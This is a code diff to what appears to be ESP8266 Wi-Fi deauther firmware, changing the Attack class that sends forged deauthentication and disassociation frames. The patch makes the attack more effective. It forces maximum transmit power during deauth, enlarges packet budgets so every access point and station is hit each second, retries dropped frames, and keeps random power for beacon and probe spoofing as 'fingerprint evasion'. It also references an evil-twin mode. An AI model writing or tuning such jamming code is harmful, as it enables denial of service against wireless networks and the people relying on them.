@@ -31,6 +31,11 @@ void Attack::start() {
     attackStartTime = currentTime;
     accesspoints.sortAfterChannel();
     stations.sortAfterChannel();
+    /* Set maximum TX power before the first packet is sent.
+       updateCounter() normally does this, but it only runs after the first
+       1-second tick — without this call the radio stays at whatever power
+       level was last set (could be 0 dBm from a previous random_tx cycle). */
+    setOutputPower(20.5f);
     running = true;
 }
 
@@ -43,10 +48,17 @@ void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool ou
     Attack::output  = output;
     Attack::timeout = timeout;
 
-    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
-    // scan.countSelected() > 0)){
     if (beacon || probe || deauthAll || deauth || !EvilTwin::isRunning()) {
         start();
+        /* stop() inside start() clears active flags when restarting a running
+           attack. Re-apply them so updateCounter() computes the correct maxPkts. */
+        Attack::beacon.active = beacon;
+        Attack::deauth.active = deauth || deauthAll;
+        Attack::probe.active  = probe;
+        /* Pre-compute maxPkts immediately — normally updateCounter() runs only
+           after the first 1-second tick, leaving maxPkts=0 and blocking all
+           packets for the entire first second of the attack. */
+        updateCounter();
     } else {
         prntln(A_NO_MODE_ERROR);
         EvilTwin::stop();
@@ -94,13 +106,20 @@ void Attack::updateCounter() {
     // deauth packets per second
     if (deauth.active) {
         if (deauthAll) {
-            uint32_t total = accesspoints.count() + stations.count() * 2;
-            uint32_t excl  = names.selected();
+            /* Count actual frames, not targets.
+               AP broadcast deauth  = 2 frames (deauth + disassoc, AP→FF:FF:FF:FF:FF:FF).
+               Station unicast deauth = 4 frames (deauth+disassoc AP→STA, deauth+disassoc STA→AP).
+               deauth.packetCounter increments by these amounts, so maxPkts must match or
+               the guard (packetCounter < maxPkts) cuts the sweep short.
+               With the old formula (apCount + stCount*2), each AP consumed 2 counter
+               increments against a budget of 1 — only half the APs got deauthed per second. */
+            uint32_t total = accesspoints.count() * 2 + stations.count() * 4;
+            uint32_t excl  = names.selected() * 2; // approx: treat excluded names as AP-class (2 frames)
             deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (total > excl ? total - excl : 0);
         }
         else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
-                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
+                              (accesspoints.selected() * 2 + stations.selected() * 4 + names.selected() * 2 + names.stations() * 2);
     } else {
         deauth.maxPkts = 0;
     }
@@ -118,9 +137,18 @@ void Attack::updateCounter() {
     if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
     else probe.maxPkts = 0;
 
-    // random transmission power
-    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
-    else setOutputPower(20.5f);
+    /* TX power policy:
+       Deauth always runs at 20.5 dBm — random_tx must never reduce it.
+       random_tx only applies to beacon/probe (fingerprint evasion feature).
+       Without this guard, running deauth + beacon with random_tx=true would
+       randomly set deauth power as low as 0 dBm every second. */
+    if (deauth.active) {
+        setOutputPower(20.5f);
+    } else if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) {
+        setOutputPower((float)random(0, 21));
+    } else {
+        setOutputPower(20.5f);
+    }
 
     // reset counters
     deauthPkts           = deauth.packetCounter;
@@ -229,6 +257,10 @@ void Attack::deauthUpdate() {
                 } else deauth.tc++;
             }
 
+            /* Match deauthAllUpdate() — yield after each burst so the LWIP
+               stack and web server can process pending events. */
+            yield();
+
             // reset counter
             if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
         }
@@ -317,7 +349,7 @@ bool Attack::deauthName(int num) {
 }
 
 bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
-    if (!stMac) return false;
+    if (!apMac || !stMac) return false;
 
     bool success = false;
 
@@ -339,12 +371,13 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
     deauthpkt[22] = sc & 0xFF;
     deauthpkt[23] = (sc >> 8) & 0xFF;
 
-    deauthpkt[0] = 0xc0; // deauth
+    deauthpkt[0] = 0xc0; // deauth AP→STA
     if (sendPacket(deauthpkt, packetSize, ch, true)) { success = true; deauth.packetCounter++; }
+    delayMicroseconds(200); // drain SDK TX queue between frames
 
     uint8_t disassocpkt[packetSize];
     memcpy(disassocpkt, deauthpkt, packetSize);
-    disassocpkt[0] = 0xa0; // disassoc
+    disassocpkt[0] = 0xa0; // disassoc AP→STA
     if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
 
     if (!macBroadcast(stMac)) {
@@ -352,14 +385,19 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
         memcpy(&disassocpkt[10], stMac, 6);
         memcpy(&disassocpkt[16], stMac, 6);
 
-        disassocpkt[0] = 0xc0;
+        delayMicroseconds(200);
+        disassocpkt[0] = 0xc0; // deauth STA→AP
         if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
+        delayMicroseconds(200);
 
-        disassocpkt[0] = 0xa0;
+        disassocpkt[0] = 0xa0; // disassoc STA→AP
         if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
     }
 
-    if (success) deauth.time = currentTime;
+    /* Always advance the timer — if TX fails and we only update on success,
+       the timer never advances and the loop fires at full speed on the next
+       update() tick, flooding the SDK queue and starving the web server. */
+    deauth.time = currentTime;
     return success;
 }
 
@@ -438,13 +476,15 @@ bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
 }
 
 bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
-    // Serial.println(bytesToStr(packet, packetSize));
-
-    // set channel
     setWifiChannel(ch, force_ch);
 
-    // sent out packet
     bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
+    if (!sent) {
+        /* SDK TX queue was full — wait 500 µs for the radio to drain one slot
+           then retry once. Avoids silently dropping frames under burst load. */
+        delayMicroseconds(500);
+        sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
+    }
 
     if (sent) ++tmpPacketRate;
 
